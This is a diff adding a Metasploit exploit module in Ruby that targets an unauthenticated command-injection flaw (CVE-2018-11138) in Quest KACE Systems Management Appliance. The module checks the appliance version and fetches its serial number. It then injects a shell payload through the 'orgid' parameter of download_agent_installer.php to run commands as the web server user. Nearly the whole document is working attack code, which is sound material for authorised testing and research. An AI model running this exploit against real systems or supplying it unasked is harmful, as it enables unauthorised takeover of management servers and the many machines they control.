@@ -1,0 +1,162 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Quest KACE Systems Management Command Injection',
+      'Description'    => %q{
+        This module exploits a command injection vulnerability in Quest KACE
+        Systems Management Appliance version 8.0.318 (and possibly prior).
+
+        The `download_agent_installer.php` file allows unauthenticated users
+        to execute arbitrary commands as the web server user `www`.
+
+        A valid Organization ID is required. The default value is `1`.
+
+        A valid Windows agent version number must also be provided. If file
+        sharing is enabled, the agent versions are available within the
+        `\\kace.local\client\agent_provisioning\windows_platform` Samba share.
+        Additionally, various agent versions are listed on the KACE website.
+
+        This module has been tested successfully on Quest KACE Systems
+        Management Appliance K1000 version 8.0 (Build 8.0.318).
+      },
+      'License'        => MSF_LICENSE,
+      'Privileged'     => false,
+      'Platform'       => 'unix', # FreeBSD
+      'Arch'           => ARCH_CMD,
+      'DisclosureDate' => 'May 31 2018',
+      'Author'         =>
+        [
+          'Leandro Barragan', # Discovery and PoC
+          'Guido Leo',        # Discovery and PoC
+          'Brendan Coles',    # Metasploit
+        ],
+      'References'     =>
+        [
+          ['CVE', '2018-11138'],
+          ['URL', 'https://support.quest.com/product-notification/noti-00000134'],
+          ['URL', 'https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities']
+        ],
+      'Payload'        =>
+        {
+          'Space'       => 1024,
+          'BadChars'    => "\x00\x27",
+          'DisableNops' => true,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic perl'
+            }
+        },
+      'Targets'        => [['Automatic', {}]],
+      'DefaultTarget'  => 0))
+    register_options [
+      OptString.new('SERIAL',        [false, 'Serial number', '']),
+      OptString.new('ORGANIZATION',  [true, 'Organization ID', '1']),
+      OptString.new('AGENT_VERSION', [true, 'Windows agent version', '8.0.152'])
+    ]
+  end
+
+  def check
+    res = send_request_cgi('uri' => normalize_uri('common', 'download_agent_installer.php'))
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    unless res.code == 302 && res.headers.to_s.include?('X-KACE-Appliance')
+      vprint_status 'Remote host is not a Quest KACE appliance'
+      return CheckCode::Safe
+    end
+
+    unless res.headers['X-KACE-Version'] =~ /\A([0-9]+)\.([0-9]+)\.([0-9]+)\z/
+      vprint_error 'Could not determine KACE appliance version'
+      return CheckCode::Detected
+    end
+
+    version = Gem::Version.new res.headers['X-KACE-Version'].to_s
+    vprint_status "Found KACE appliance version #{version}"
+
+    # Patched versions : https://support.quest.com/product-notification/noti-00000134
+    if version < Gem::Version.new('7.0') ||
+       (version >= Gem::Version.new('7.0') && version < Gem::Version.new('7.0.121307')) ||
+       (version >= Gem::Version.new('7.1') && version < Gem::Version.new('7.1.150')) ||
+       (version >= Gem::Version.new('7.2') && version < Gem::Version.new('7.2.103')) ||
+       (version >= Gem::Version.new('8.0') && version < Gem::Version.new('8.0.320')) ||
+       (version >= Gem::Version.new('8.1') && version < Gem::Version.new('8.1.108'))
+      return CheckCode::Appears
+    end
+
+    CheckCode::Safe
+  end
+
+  def serial_number
+    return datastore['SERIAL'] unless datastore['SERIAL'].to_s.eql? ''
+
+    res = send_request_cgi('uri' => normalize_uri('common', 'about.php'))
+    return unless res
+
+    res.body.scan(/Serial Number: ([A-F0-9]+)/).flatten.first
+  end
+
+  def exploit
+    check_code = check
+    unless [CheckCode::Appears, CheckCode::Detected].include? check_code
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    serial = serial_number
+    if serial.to_s.eql? ''
+      print_error 'Could not retrieve appliance serial number. Try specifying a SERIAL.'
+      return
+    end
+    vprint_status "Using serial number: #{serial}"
+
+    print_status "Sending payload (#{payload.encoded.length} bytes)"
+
+    vars_get = Hash[{
+      'platform' => 'windows',
+      'serv'     => Digest::SHA256.hexdigest(serial),
+      'orgid'    => "#{datastore['ORGANIZATION']}#; #{payload.encoded} ",
+      'version'  => datastore['AGENT_VERSION']
+    }.to_a.shuffle]
+
+    res = send_request_cgi({
+      'uri'      => normalize_uri('common', 'download_agent_installer.php'),
+      'vars_get' => vars_get
+    }, 10)
+
+    unless res
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    unless res.headers.to_s.include?('KACE') || res.headers.to_s.include?('KBOX')
+      fail_with Failure::UnexpectedReply, 'Unexpected reply'
+    end
+
+    case res.code
+    when 200
+      print_good 'Payload executed successfully'
+    when 404
+      fail_with Failure::BadConfig, 'The specified AGENT_VERSION is not valid for the specified ORGANIZATION'
+    when 302
+      if res.headers['location'].include? 'error.php'
+        fail_with Failure::UnexpectedReply, 'Server encountered an error'
+      end
+      fail_with Failure::BadConfig, 'The specified SERIAL is incorrect'
+    else
+      print_error 'Unexpected reply'
+    end
+
+    register_dir_for_cleanup "/tmp/agentprov/#{datastore['ORGANIZATION']}#;/"
+  end
+end
